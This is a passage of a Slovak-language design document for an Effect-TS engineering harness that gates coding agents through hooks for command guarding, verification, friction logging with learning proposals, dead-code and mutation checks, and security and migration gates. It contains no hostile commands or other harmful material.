- **Vstup pre model:**
  ```json
  {
    "failureOutput": "AssertionError: expected 5 to deeply equal 6 at Object.runTask (domain/task.test.ts:42)"
  }
  ```
- **Výstup modelu:**
  ```json
  {
    "answers": {
      "kind": { "label": "semantic" }
    }
  }
  ```

#### 4. `PlanStepCoverageV1`

- **Vstup pre model:**
  ```json
  {
    "stepId": "TASK-102",
    "planStep": "Add PhotoNotFoundError tagged error and return it when photo does not exist",
    "stepDiff": "diff --git a/libs/sample/contract/src/index.ts b/libs/sample/contract/src/index.ts\n+export class PhotoNotFoundError extends Schema.TaggedError<PhotoNotFoundError>()(\"PhotoNotFoundError\", { id: Schema.Number }) {}"
  }
  ```
- **Výstup modelu:**
  ```json
  {
    "answers": {
      "implemented": { "probability": 0.98 },
      "noOutOfScopeEdits": { "probability": 0.95 }
    }
  }
  ```
- **Vyhodnotenie v kóde:** `0.98 >= 0.7 && 0.95 >= 0.7` $\rightarrow$ `covered: true`.

#### 5. `LearnProposalV1`

Analyzuje nakopené trenie z `.harness/friction-log.jsonl` a odporúča jeho povýšenie do deterministických pravidiel alebo vzorov.

- **Vstup pre model:**
  ```json
  {
    "kind": "route_miss",
    "summary": "Plan step not matched: Implement Durable Object rate limiter with sliding window",
    "detail": "harness route returned review with fitsAny 0.42",
    "occurrences": 3
  }
  ```
- **Výstup modelu:**
  ```json
  {
    "answers": {
      "actionable": { "probability": 0.94 },
      "target": {
        "label": "agent-pattern",
        "rationale": "Recurring DO sliding-window rate limiting idiom should be documented in agent-patterns/durable-object-ratelimit.md and registered in IdiomRouterV1"
      }
    }
  }
  ```
- **Vyhodnotenie v kóde:** `0.94 >= 0.7` $\rightarrow$ navrhuje vytvorenie nového vzoru `agent-patterns/durable-object-ratelimit.md` s registráciou v `IdiomRouterV1`.

---

## 4. Prehľad všetkých vstupov, výstupov a stavov ukončenia (Claude Code vs. Antigravity adaptér)

Harness CLI podporuje bezproblémovú koexistenciu oboch popredných agentických platforiem. Rozdiel v protokole je riadený prítomnosťou prepínača `--format=antigravity` alebo automatickou detekciou formátu na vstupe `stdin`.

### 4.1 Porovnávacia tabuľka adaptérov

| Príkaz CLI | Claude Code volanie & I/O | Antigravity volanie & I/O | `exitCode` | Význam a dôsledok pre agenta |
| :--- | :--- | :--- | :--- | :--- |
| **`guard`** | **Arg:** `harness guard`<br/>**stdin:** `{"tool_input": {"command": "..."}}`<br/>**stdout (allow):** `""` (prázdny)<br/>**stdout (ask):** `{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "ask", "permissionDecisionReason": "..."}}`<br/>**stderr (deny):** `Blocked by harness guard: <cmd>` | **Arg:** `harness guard --format=antigravity`<br/>**stdin:** `{"toolCall": {"name": "run_command", "args": {"CommandLine": "..."}}}`<br/>**stdout (allow):** `{"decision": "allow"}`<br/>**stdout (ask):** `{"decision": "ask", "reason": "..."}`<br/>**stdout (deny):** `{"decision": "deny", "reason": "..."}` | • `exitCode: 0` pri allow, ask a antigravity deny<br/>• `exitCode: 2` pri Claude deny | **allow:** Príkaz sa okamžite spustí.<br/>**ask:** Používateľ je vyzvaný na schválenie v UI.<br/>**deny:** Príkaz je tvrdo zablokovaný. |
| **`ingest`** | **Arg:** `harness ingest`<br/>**stdout:** `{"indexedFns": 42}` | **Arg:** `harness ingest --format=antigravity`<br/>**stdout:** `{}` | `exitCode: 0` | Spúšťa sa v `PostToolUse` po každom zápise súboru (`write_to_file`, `replace_file_content`). Aktualizuje index spanov. |
| **`session` / `doctor`** | **Arg:** `harness session`<br/>**stdout:** `{"nodeVersion": "...", "nodeOk": true, "snapshotDirOk": true, "omnigraphInitialized": true, "modelWarm": true, "handoff": {...}}` | **Arg:** `harness session --format=antigravity`<br/>**stdout:** `{"injectSteps": ["[Harness Context Handoff] Active stub() skeletons remaining: ..."]}` | • `exitCode: 0` (prostredie OK)<br/>• `exitCode: 1` (Node < 24 alebo zlyhanie) | Overuje dostupnosť Node.js 24+, existenciu `.harness/`, dostupnosť Omnigraphu a zahriatie modelu `clef-flash`. Cez `SessionHandoff.decide` automaticky injektuje rozpracovaný stav (`activeStubs`, `missingPlannedFns`, `stampValid`, `frictionClusters`). |
| **`route`** | **Arg:** `harness route "<step>"`<br/>**stdout:** Názov súboru (napr. `agent-patterns/d1-repository.md` alebo `"review"`) | **Rovnaké CLI volanie** alebo cez MCP nástroj `harness_route` s parametrom `{"planStep": "..."}` | `exitCode: 0` | Nájde zodpovedajúci vzor architektúry Effect/Alchemy. |
| **`plan-check`** | **Arg:** `harness plan-check`<br/>Voliteľne: `--graph-only`<br/>**stdout:** Kompletný Mermaid diagram grafu<br/>**stderr:** Zoznam chýb a porušení pravidiel | **Rovnaké CLI volanie** (spúšťa sa priamo v termináli agenta) | • `exitCode: 0` (plán overený)<br/>• `exitCode: 1` (chyba typov, duplicitný span, cyklus alebo nepovolená závislosť) | Overuje integritu skeletonu, generuje `.harness/plan-graph-snapshot.json` a ukladá do Omnigraph branch `plan/current`. |
| **`gc`** | **Arg:** `harness gc`<br/>Voliteľne: `--strict`<br/>**stdout (čisté):** `{"clean": true, "findings": []}`<br/>**stderr (nálezy):** Zoznam `GcFinding` (`unused-service`, `unprovided-service`, `dead-tagged-error`, `orphan-effect-fn`, `untested-effect-fn`, `missing-decider-property-test`, `missing-pattern-doc`, `stale-doc-reference`) | **Rovnaké CLI volanie** (alebo `--format=antigravity`) | • `exitCode: 0` (graf čistý)<br/>• `exitCode: 1` (zistené mŕtve uzly/entropia) | Skenuje `HarnessGraph` cez `GraphGc.decide`. Zabraňuje hromadeniu mŕtvych chýb, nepoužitých služieb, netestovaných deciderov a chýbajúcich vzorov pred `verify` a `done`. |
| **`mutate`** | **Arg:** `harness mutate`<br/>Voliteľne: `--strict`<br/>**stdout (100% skóre):** `{"totalMutants": 8, "killed": 8, "survived": 0, "mutationScore": 1}`<br/>**stderr (prežité mutanty):** Zoznam prežitých mutantov v `type:domain` | **Rovnaké CLI volanie** (alebo `--format=antigravity`) | • `exitCode: 0` (100% mutantov zabitých)<br/>• `exitCode: 1` (prežité mutanty pri `--strict`) | Cielené AST mutačné testovanie doménovej logiky (`MutationCheck.decide`). Injektuje hraničné a aritmetické operátory (`>=` $\to$ `>`, `+ 1` $\to$ `- 1`) a overuje, že testy majú reálnu diskriminačnú silu. |
| **`verify`** | **Arg:** `harness verify`<br/>**stdout:** Reťazec pečiatky: `{"treeHash": "...", "timestamp": "...", "taskBranch": "impl/current"}`<br/>**stderr:** Detaily o zlyhaní testov alebo nájdených `stub()` | **Rovnaké CLI volanie** (spúšťa sa priamo v termináli agenta) | • `exitCode: 0` (overenie úspešné)<br/>• `exitCode: 1` (nájdený `stub()`, zlyhanie testu, neplatný graf) | **Jediná autorizovaná brána.** Spúšťa testy s testovacím tracerom, zapisuje `.harness/verify-stamp.json` a branch `impl/current`. |
| **`done`** | **Arg:** `harness done`<br/>**stdout (úspech):** `""`<br/>**stdout (zlyhanie):** `{"decision": "block", "reason": "..."}` | **Arg:** `harness done --format=antigravity`<br/>**stdin:** `{"fullyIdle": true}`<br/>**stdout (úspech):** `{"decision": "stop"}`<br/>**stdout (pokračovať):** `{"decision": "continue", "reason": "..."}` | `exitCode: 0` | Záverečný `Stop` hook. Kontroluje nezmenenosť stromu cez SHA-256 pečiatku, paritu grafov plánu a implementácie a robí merge v Omnigraphe. |
| **`learn`** | **Arg:** `harness learn`<br/>Voliteľne: `--clear`<br/>**stdout:** Prehľad klastrov trenia a odporúčaní `LearnProposalV1` | **Rovnaké CLI volanie** | `exitCode: 0` | Analyzuje `.harness/friction-log.jsonl`, navrhuje povýšenia do 4 cieľov pyramídy a s `--clear` vymaže log trenia. |

---

### 4.2 Príklad konfigurácie hookov

#### Claude Code (`adapters/claude-code/hooks.json`)
```json
{
  "hooks": {
    "SessionStart": [{
      "hooks": [{
        "type": "command",
        "command": "node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts session"
      }]
    }],
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts guard"
      }]
    }],
    "PostToolUse": [{
      "matcher": "Edit|Write",
      "hooks": [{
        "type": "command",
        "command": "node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts ingest"
      }]
    }],
    "Stop": [{
      "hooks": [{
        "type": "command",
        "command": "node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts done"
      }]
    }]
  }
}
```

#### Antigravity (`adapters/antigravity/plugins/effect-harness/hooks.json`)
```json
{
  "effect-harness": {
    "PreInvocation": [{
      "type": "command",
      "command": "node --import ../../../../tools/node-ts-resolver.mjs ../../../../apps/harness-cli/src/index.ts session --format=antigravity",
      "timeout": 15
    }],
    "PreToolUse": [{
      "matcher": "run_command",
      "hooks": [{
        "type": "command",
        "command": "node --import ../../../../tools/node-ts-resolver.mjs ../../../../apps/harness-cli/src/index.ts guard --format=antigravity",
        "timeout": 10
      }]
    }],
    "PostToolUse": [{
      "matcher": "replace_file_content|multi_replace_file_content|write_to_file",
      "hooks": [{
        "type": "command",
        "command": "node --import ../../../../tools/node-ts-resolver.mjs ../../../../apps/harness-cli/src/index.ts ingest --format=antigravity",
        "timeout": 30
      }]
    }],
    "Stop": [{
      "type": "command",
      "command": "node --import ../../../../tools/node-ts-resolver.mjs ../../../../apps/harness-cli/src/index.ts done --format=antigravity",
      "timeout": 30
    }]
  }
}
```

---

## 5. Spätná slučka učenia (Compound Learning Loop — `.harness/friction-log.jsonl` & `harness learn` + `LearnProposalV1` + skill `compounding-effect-learnings`)

Vývojové prostredie s autonómnymi agentmi prirodzene naráža na opakujúce sa prekážky (friction events) — neúspešné hľadanie vzorov (`route_miss`), mechanické zlyhania kompilátora a testov (`verify_failure`), alebo eskalácie bezpečných shellových príkazov (`guard_escalation`).

Tradičným zlozvykom vývojových tímov je nekontrolované pridávanie textových zákazov, varovaní a pravidiel do globálneho súboru `AGENTS.md`. Tento prístup je však kontraproduktívny:
- **Nafukuje systémový kontext:** Každý jeden ťah agenta konzumuje zbytočné prompt tokeny, čo zvyšuje latenciu aj náklady.
- **Znižuje pozornosť modelu (prompt fatigue):** LLM modely pri dlhých zoznamoch textových pravidiel vykazujú zníženú spoľahlivosť a zákazy často ignorujú.

Architektúra **Effect-TS Engineering Harness** namiesto nafukovania `AGENTS.md` zavádza mechanizmus **Compound Learning Loop**, ktorý transformuje trenie na trvalé, nulovo-tokenové deterministické brány alebo štíhle vzory.

```mermaid
graph TD
    FL[".harness/friction-log.jsonl<br/>(route_miss | verify_failure | guard_escalation)"] --> LEARN["harness learn<br/>(clef-flash LearnProposalV1)"]
    
    LEARN --> P1["1. agent-pattern<br/>(agent-patterns/*.md + IdiomRouterV1)"]
    LEARN --> P2["2. triage-rule<br/>(DETERMINISTIC_TRIAGE_RULES)"]
    LEARN --> P3["3. guard-allowlist<br/>(policy.ts ALLOWLIST)"]
    LEARN --> P4["4. ast-graph-gate<br/>(syntax-bans.js / checkEffectGraph)"]

    P1 -.-> ZERO["0 dodatočných tokenov v AGENTS.md<br/>Deterministická brána / Kontext on-demand"]
    P2 -.-> ZERO
    P3 -.-> ZERO
    P4 -.-> ZERO
```

### 5.1 Zber trenia do `.harness/friction-log.jsonl`

Harness automaticky zaznamenáva každú udalosť trenia do append-only súboru `.harness/friction-log.jsonl`:
1. **`route_miss`:** Nastáva, keď `harness route` alebo MCP nástroj `harness_route` vráti `"review"` (žiadny zavedený vzor v `agent-patterns/*.md` nezodpovedá zadaniu s istotou $\ge 0.7$).
2. **`verify_failure`:** Nastáva, keď `harness verify` zlyhá na kompilácii, teste alebo zakázanej syntaxi.
3. **`guard_escalation`:** Nastáva, keď `harness guard` eskaluje bezpečný, no neznámy príkaz na používateľa (`decision: "ask"`).

### 5.2 Analýza a návrhy povýšenia (`harness learn` & `LearnProposalV1`)

Po dokončení úlohy alebo série úloh vývojár alebo agent spustí:
```bash
node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts learn
```
Príkaz zoskupí udalosti do klastrov (`summarizeFrictionEvents`) a predloží ich modelu `clef-flash` cez schému `LearnProposalV1` (`proposeLearningAction`).

Model posúdi, či je zistené trenie akcieschopné (`actionable >= 0.7`), a zaradí ho do jedného zo 4 cieľov pyramídy povýšenia (**Graduation Pyramid**):

### 5.3 4 Ciele povýšenia (Graduation Pyramid)

1. **`agent-pattern` (pre `route_miss` a nové Effect v4 / Alchemy v2 vzory):**
   - Vytvorenie alebo aktualizácia špecifického receptu v `agent-patterns/<block>.md` (50–80 riadkov čistého, otestovaného TypeScript kódu).
   - Registrácia identifikátora `<block>` do zoznamu `IDIOM_BLOCKS` a rozhodovacej schémy `IdiomRouterV1` v `libs/harness/decision/src/idiom-router.ts` (až do 26 volieb).
   - Budúce behy `harness route` automaticky priradia relevantný krok k tomuto vzoru.
2. **`triage-rule` (pre mechanické zlyhania `verify_failure`):**
   - Pridanie objektu `{ pattern: RegExp, result: { kind: "mechanical", hint: "..." } }` do poľa `DETERMINISTIC_TRIAGE_RULES` v `libs/harness/decision/src/triage-decision.ts`.
   - Pri ďalšom zlyhaní s danou chybou agent dostane okamžitú nápovedu za `0 ms` bez nutnosti volania LLM modelu.
3. **`guard-allowlist` (pre opakujúce sa bezpečné príkazy `guard_escalation`):**
   - Pridanie prefixu bezpečného príkazu do `ALLOWLIST` v `libs/harness/gates/src/policy.ts`.
   - Príkaz sa v budúcich úlohách spúšťa okamžite (`decision: "allow"`) bez eskalácie na človeka.
4. **`ast-graph-gate` (pre opakujúce sa architektonické alebo syntaktické anti-patterny):**
   - Povýšenie do statického pravidla v `tools/oxlint/syntax-bans.js` (napr. zákaz `Promise.all`, zákaz `throw`, zákaz `try/catch`) alebo architektonického invariantu v `libs/harness/graph/src/policy-check.ts` (`checkEffectGraph`).
   - Ani jeden agent v budúcnosti nebude schopný túto chybu zopakovať, pretože kód neprejde cez `oxlint` alebo `harness verify`.

### 5.4 Pracovný postup so skillom `compounding-effect-learnings`

Agenti v adaptéroch Antigravity a Claude Code používajú skill `compounding-effect-learnings`:
1. **Spustenie analýzy:** `node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts learn` zobrazí návrhy klastrov trenia a `LearnProposalV1` odporúčania.
2. **Aplikácia schváleného povýšenia:** Agent alebo vývojár zapracuje nový `agent-pattern`, `triage-rule`, `guard-allowlist` alebo `ast-graph-gate`.
3. **Overenie a vyčistenie:**
   ```bash
   node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts verify
   node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts learn --clear
   ```
   Prepínač `--clear` vyprázdni `.harness/friction-log.jsonl` a pripraví repozitár na ďalšiu prácu s novými deterministickými zárukami.

---

## 6. Pokročilé 2026 Harness Engineering Mechanizmy

V modernom vývojovom procese s paralelnými autonómnymi subagentmi vznikajú špecifické riziká: akumulácia mŕtveho kódu a nezapojených služieb, strata kontextu pri reštarte konverzácie alebo compactingu, skryté výkonnostné degradácie (N+1 databázové a RPC dotazy), kolízie stavových súborov medzi súbežnými pracovníkmi, bezpečnostné zraniteľnosti a deštruktívne databázové migrácie.

Effect-TS Engineering Harness rieši tieto výzvy prostredníctvom pokročilých deterministických mechanizmov a troch finálnych E1–E8 SDLC ochrán:

```mermaid
graph TD
    subgraph "Pokročilé 2026 Mechanizmy"
        GC["1. harness gc --strict<br/>(GraphGc.decide)"]
        HANDOFF["2. Context Reset & Handoff<br/>(SessionHandoff.decide)"]
        BUDGET["3. Runtime Span Budgets<br/>(SpanBudget.decide)"]
        WORKTREE["4. Worktree-Safe Izolácia<br/>(resolveHarnessStateDir)"]
        GATES["5. Security & Migration Gates<br/>(syntax-bans & MigrationSafety)"]
        LENSES["6. Multi-Lens Review<br/>(Signal-Routed flash Subagents)"]
        MUTATE["7. AST Mutation Testing<br/>(MutationCheck.decide)"]
        SDLC["8. E1–E8 SDLC Protections<br/>(TestIntegrity, LoopBreaker, GuardWrite)"]
    end

    GC -->|Audituje| G_ENTROPY["unused-service<br/>unprovided-service<br/>dead-tagged-error<br/>orphan-effect-fn<br/>untested-effect-fn<br/>missing-decider-property-test<br/>missing-pattern-doc<br/>stale-doc-reference"]
    HANDOFF -->|Injektuje| HO_DATA["activeStubs<br/>missingPlannedFns<br/>verify-stamp stav<br/>friction clusters"]
    BUDGET -->|Deteguje| B_VIOLATION["n-plus-one-call<br/>span-duration-exceeded"]
    WORKTREE -->|Izoluje| WT_DIR[".harness/worktrees/&lt;id&gt;<br/>HARNESS_WORKTREE_ID"]
    GATES -->|Blokuje| G_SAFETY["Config.redacted<br/>raw SQL injection<br/>Schedule.forever<br/>DROP / rebuild / NOT NULL"]
    LENSES -->|Overuje| L_SPECIALISTS["EARS & Test-Fidelity<br/>Security & Trust<br/>Reliability & Concurrency<br/>Adversarial Chaos"]
    MUTATE -->|Vyžaduje| M_SCORE["100% Mutation Score<br/>0 prežitých mutantov<br/>(>=, <=, ===, +1)"]
    SDLC -->|Vynucuje| S_RULES["it.skip / @ts-ignore ban<br/>Loop Circuit-Breaker (>=3)<br/>classifyFileWrite (DENY/ASK)"]
```

### 6.1 `harness gc` (`GraphGc.decide` — Boj proti entropii a mŕtvemu kódu)

Počas rýchlych iterácií v subagentoch dochádza k hromadeniu mŕtveho kódu, ktorý bežný TypeScript kompilátor toleruje. Príkaz `harness gc` spúšťa statickú analýzu nad celým `HarnessGraph` a pomocou čistej rozhodovacej funkcie `GraphGc.decide` identifikuje 8 druhov entropie:

1. **`unused-service`:** Služba (`Context.Service`), ktorú v monorepe nepožaduje žiadna funkcia v parametri prostredia `R`.
2. **`unprovided-service`:** Služba požadovaná doménou v type `R`, ktorá však nie je poskytnutá žiadnym produkčným `Layer`om v `type:infra` ani `type:app`.
3. **`dead-tagged-error`:** Chybová trieda (`Schema.TaggedErrorClass`), ktorú žiadna use-case funkcia nevracia v type `E`.
4. **`orphan-effect-fn`:** Funkcia deklarovaná cez `Effect.fn`, na ktorú neodkazuje žiadny volajúci ani integračný test.
5. **`untested-effect-fn` (pri `--strict`):** Doménová funkcia deklarovaná cez `Effect.fn`, ktorá nemá v grafe prichádzajúcu `ExercisesSpan` hranu z `@effect/vitest` testov. Každý doménový use-case musí byť overený aspoň jedným testom.
6. **`missing-decider-property-test` (pri `--strict`):** Čistý doménový decider (`*.decide` v `type:domain`), ktorý nie je testovaný property-based testom (`it.effect.prop` alebo `it.prop`). Všetky pure decidery (klauzuly EARS `WHILE <state>`) a reducery/projekcie musia byť overené voči arbitrárnym generovaným vstupom zo `Schema` cez `effect/Arbitrary`.
7. **`missing-pattern-doc`:** Použitý architektonický blok, ku ktorému chýba zdokumentovaný predpis v `agent-patterns/*.md`.
8. **`stale-doc-reference` (pri `--strict`):** Odkaz v akceptovaných špecifikáciách alebo ADR na neexistujúci súbor v `enforced_by` alebo neexistujúci symbol (`spans`, `services`, `errors`) v grafe.

```bash
node --import ./tools/node-ts-resolver.mjs apps/harness-cli/src/index.ts gc --strict
```
Ak `harness gc` nájde akúkoľvek entropiu, vráti `exit 1` s podrobným zoznamom `findings`. Tento krok predchádza `harness verify` a zabraňuje zlučovaniu technického dlhu.

### 6.2 Context Reset & State Handoff v `harness session` (`SessionHandoff.decide`)

Pri dlhotrvajúcich úlohách alebo po príkaze `/compact` agent často stratí kontext o tom, čo už bolo implementované a čo zostáva dokončiť.

Príkaz `harness session` (volaný pri každom štarte relácie cez `PreInvocation` v Antigravity alebo `SessionStart` v Claude Code) spúšťa `SessionHandoff.decide`:
- Skontroluje zostávajúce kostry `stub<A, E, R>()` (`activeStubs`).
- Porovná plán s implementáciou a identifikuje chýbajúce funkcie (`missingPlannedFns`).
- Overí stav kryptografickej pečiatky `.harness/verify-stamp.json` (`stampValid`).
- Zosumarizuje nedávne trenia z `.harness/friction-log.jsonl` (`frictionClusters`).

**Dôsledok pre adaptéry:**
- **Antigravity (`PreInvocation`):** Do kontextu agenta sa automaticky injektuje štruktúrovaná nápoveda:
  ```json
  {
    "injectSteps": [
      "[Harness Context Handoff] Active stub() skeletons remaining: Cart.checkout, PaymentService.process. Verify stamp invalid. Recent friction: 2 route_miss events."
    ]
  }
  ```
- **Claude Code (`SessionStart`):** Handoff zhrnutie je odoslané na `stdout` relácie.

Agent tak okamžite nadviaže na rozpracovaný stav bez nutnosti re-skenovania repozitára.

### 6.3 Runtime Span Budgets & N+1 Detektor (`SpanBudget.decide`)

Výkonnostné regresie a neefektívne databázové volania (N+1 query anti-pattern) sú častým vedľajším produktom práce LLM.

Harness v testovacom prostredí integruje `makeRecordingTracer` a rozhodovaciu funkciu `SpanBudget.decide`:
- **Meranie latencie:** Každý span `Effect.fn` zaznamenáva presný čas vykonávania `durationMs`.
- **Detekcia N+1 opakovaných volaní (`n-plus-one-call`):** Ak rodičovský span vykoná v rámci jednej operácie viac ako povolený limit opakovaných volaní pod-spanu (`maxRepeatedChildCalls`, typicky $\le 3$), kontrola `checkSpanBudgets` vyhlási porušenie.
- **Prekročenie časového rozpočtu (`span-duration-exceeded`):** Ak celkové trvanie spanu prekročí limit `maxSpanDurationMs`, test indikuje výkonnostné zlyhanie.

Tieto rozpočty sa overujú priamo v `@effect/vitest` testoch pomocou helpera `checkSpanBudgets(input)`.

### 6.4 Worktree-Safe Izolácia Subagentov (`Workspace: "share"` & `resolveHarnessStateDir`)

Pri paralelnom spustení implementačných subagentov pre rôzne balíky (`type:domain`, `type:infra`, `scope:web`) hrozí vzájomné prepisovanie stavových súborov v zdieľanom `.harness/` priečinku.

Harness rieši izoláciu prostredníctvom helpera `resolveHarnessStateDir`:
```typescript
export const resolveHarnessStateDir = (
  repoRoot: string,
  env: NodeJS.ProcessEnv = process.env
): string => {
  const customDir = env.HARNESS_STATE_DIR?.trim()
  if (customDir && customDir.length > 0) return resolve(repoRoot, customDir)
  const worktreeId = env.HARNESS_WORKTREE_ID?.trim()
  if (worktreeId && worktreeId.length > 0) {
    const sanitized = worktreeId.replace(/[^a-zA-Z0-9._-]/g, "_")
    return join(repoRoot, ".harness", "worktrees", sanitized)
  }
  return join(repoRoot, ".harness")
}
```

- **Antigravity:** Subagenty sa spúšťajú s parametrom `Workspace: "share"`.
- **Súbežné CLI príkazy:** Každý subagent nastavuje `HARNESS_WORKTREE_ID=<unit>` (alebo `HARNESS_STATE_DIR`), vďaka čomu sa jeho dočasné pečiatky a medzistavy ukladajú do `.harness/worktrees/<id>/` a nekolidujú s ostatnými subagentmi.

### 6.5 Deterministické Security, Reliability & Migration Brány (`syntax-bans.js` + `MigrationSafety.decide` + `untested-effect-fn`)

Harness presadzuje nulovú dôveru voči generovanému kódu prostredníctvom prísnych statických kontrol a AST pravidiel:

1. **`Config.redacted` pre tajomstvá a kľúče:**
   - Každá konfigurácia obsahujúca citlivé údaje s kľúčmi ako `SECRET`, `TOKEN`, `PASSWORD` alebo `API_KEY` musí byť zapuzdrená cez `Config.redacted(...)` namiesto obyčajného `Config.string(...)`.
   - Tým sa zabráni nechcenému úniku citlivých hodnôt do logov, tracerov alebo chybových hlásení.
2. **Zákaz raw SQL interpolácie (SQL Injection Ban):**
   - V `type:infra` (D1, SQLite, Drizzle) je prísne zakázané používať template literal interpoláciu v metódach `.exec(\`...\${...}\`)` alebo `.prepare(\`...\${...}\`)`.
   - Všetky dynamické hodnoty musia byť odovzdávané výhradne cez parametrizované dotazy (`.bind(...)` alebo Drizzle `sql` tagy s parametrami).
3. **Pravidlá čistoty domény (`type:domain`):**
   - **Zákaz nečistých globálnych volaní:** Volania `Date.now()`, `new Date()` a `Math.random()` sú v doméne zakázané. Čas a náhodnosť musia pretekať cez Effect služby (`Clock`, `Random`) alebo decider vstupy, aby bola doménová logika 100% deterministická a testovateľná.
   - **Zákaz `Effect.ignore`:** V doméne je zakázané ignorovať zlyhania cez `Effect.ignore`, pretože to maskuje kritické sad-path stavy a zlyhania biznis pravidiel.
4. **Zákaz neohraničeného `Schedule.forever` v `Effect.retry`:**
   - Pokusy o neohraničené znovuspustenie (`Schedule.forever`) v kombinácii s `Effect.retry` vedú v cloudovom serverless prostredí (Cloudflare Workers / DO) k vyčerpaniu pamäte, zamrznutiu vlákna a nekonečným slučkám.
   - Povolené sú iba ohraničené politiky s jitterom a stropom (napr. `Schedule.exponential(...) |> Schedule.intersect(Schedule.recurs(5))`).
5. **`MigrationSafety.decide` (Detekcia nebezpečných D1/SQLite migrácií):**
   - Simuluje a analyzuje vygenerované SQL migračné skripty:
     - Deteguje deštruktívne príkazy `DROP TABLE`, `DROP COLUMN`, `DROP INDEX`.
     - Deteguje SQLite table rebuildy vytvárajúce dočasné tabuľky `__new_<table_name>`, ktoré môžu spôsobiť stratu dát pri veľkých datasetoch.
     - Deteguje `ALTER TABLE ... ADD COLUMN ... NOT NULL` bez explicitnej klauzuly `DEFAULT`, čo v SQLite spôsobí zlyhanie pri existujúcich riadkoch.
   - Pri detekcii takýchto operácií skript okamžite končí s **`exit 2` a statusom `ESCALATE`**, čím si vyžiada explicitné potvrdenie používateľom.
6. **`untested-effect-fn` v `harness gc --strict`:**
   - Kontroluje, že každý doménový `EffectFn` má v kompilovanom grafe prichádzajúcu `ExercisesSpan` hranu z testov. Neotestovaná doménová funkcia je považovaná za zlyhanie brány.

### 6.6 Signal-Routed Multi-Lens Review (`flash` špecializované šošovky v `executing-effect-stubs` & `planning-effect-skeletons`)

Pred spustením finálnych brán `harness gc --strict` a `harness verify` koordinátor nespúšťa jediného generického recenzenta, ale smeruje kontrolu cez **paralelné špecializované subagenty (`research` subagents s modelom `flash` a `Workspace: "share"`)**. 

Výber šošoviek je riadený signálmi — presným zoznamom balíkov a schopností, ktoré daná úloha modifikovala:

| Špecializovaná šošovka (Lens) | Kedy sa spúšťa (Aktivácia signálom) | Zameranie kontroly a odhaľované riziká |
| :--- | :--- | :--- |
| **1. `EARS & Test-Fidelity Lens`** | **Vždy** (každá úloha) | Overuje, že každá EARS klauzula (`WHEN`, `IF/THEN`, `WHILE`) má citlivé testovacie tvrdenie v `@effect/vitest`. Odmieta prázdne/mock-only testy a prísne kontroluje pokrytie sad-path vetiev pre všetky deklarované `TaggedError`s. |
| **2. `Security & Trust-Boundary Lens`** | Pri zásahu do `type:contract`, `HttpApi`, `Rpc`, auth alebo `Config` | Kontroluje autorizáciu aktéra a tenanta (prevencia IDOR) v use-caseoch, správu tajomstiev cez `Config.redacted`, a reštrikcie na vstupných Schémach (ohraničené dĺžky reťazcov, polí, konečné čísla `Schema.Finite`). |
| **3. `Reliability & Concurrency Lens`** | Pri zásahu do `type:infra`, DO SQLite, D1, Queues, `Schedule` alebo `Scope` | Kontroluje striktnú synchrónnu SQLite transakčnú disciplínu v DO (zákaz asynchrónneho I/O vo vnútri `runSyncTransaction`), ohraničené retry stratégie s jitterom a limitom, timeouty na externých `HttpClient` volaniach a bezpečné finišéry v `Scope`. |
| **4. `Adversarial Chaos Lens`** | Pri stavových a viac-krokových tokoch, Event Sourcingu, Outboxe, Projekciách a Process Manageroch | Simuluje rolu chaos inžiniera: konštruuje konkrétne sekvencie zlyhaní (duplicitné doručenie `commandId`, out-of-order správy v Queue, crash medzi commitom do SQLite a odoslaním DO alarmu / správy do frontu). |

Okrem fázy implementácie sa **Adversarial & Feasibility Lens** zapája už v Krok 2/3 (`planning-effect-skeletons`), kde po úspešnom `harness plan-check` audituje graf skeletonu pred pridelením práce implementátorom (idempotency kľúče v kontraktoch, reprezentácia čiastočných zlyhaní v `E` a `R`, čistota deciderov).

### 6.7 Živá Architektonická Dokumentácia (`libs/<scope>/docs/{adr,specs}/` & `docs/{adr,specs}/`) a ochrana proti zastarávaniu (`AdrDocLint.decide`, `EarsSpecLint.decide` a `stale-doc-reference` v `harness gc --strict`)

Architektonická dokumentácia v autonómnych systémoch často zlyháva na dvoch protikladných problémoch: buď chýba kontext za netriviálnymi rozhodnutiami (a agenti opakovane navrhujú zamietnuté vzory), alebo dokumentácia vznikne ako statický text a po dvoch týždňoch refaktorovania driftuje od reality.

Harness MVP v2 zavádza systém **Živej, Strojovo Overiteľnej Architektonickej Dokumentácie** rozdelený na dve komplementárne zložky podľa konvencie ko-lokovaného monorepa:

#### 1. Architektonické Rozhodovacie Záznamy (`libs/<scope>/docs/adr/NNNN-<slug>.md` & `docs/adr/`)
- **Účel:** Zaznamenávajú **Prečo & Zamietnuté Alternatívy (Why & Rejected Alternatives)**.
- **Ko-lokované umiestnenie:** Doménové rozhodnutia patria priamo do `libs/<scope>/docs/adr/NNNN-<slug>.md` (napr. `libs/harness/docs/adr/`, `libs/sample/docs/adr/`, `libs/es/docs/adr/`) so scoped identifikátorom `id: <scope>:ADR-NNNN`. Koreňový priečinok `docs/adr/` je vyhradený výhradne pre celo-monorepové prierezové pravidlá a centrálny index.
- **Kontrafaktuálne Pravidlo (Counterfactual Rule):** ADR sa zaznamenáva výhradne vtedy, ak rozhodnutie zahŕňa netriviálne obmedzenia alebo zamietnuté alternatívy, ktoré nie je možné vyčítať zo samotného kódu (*„Zopakoval by budúci inžinier alebo agent rovnakú chybu či zvrátil by tento kompromis, keby nepoznal dôvod nášho rozhodnutia?“*).
- **Reprezentácia v `HarnessGraph` & Omnigraphe (`AdrDoc` & `GovernsSymbol`):**
  - Každý ADR dokument je extrahovaný ako uzol `AdrDoc` (`_tag: "AdrDoc"`).
  - Z uzla `AdrDoc` smerujú hrany `GovernsSymbol` priamo na dotknuté uzly kódu (`EffectFn`, `ServiceTag`, `TaggedError`).
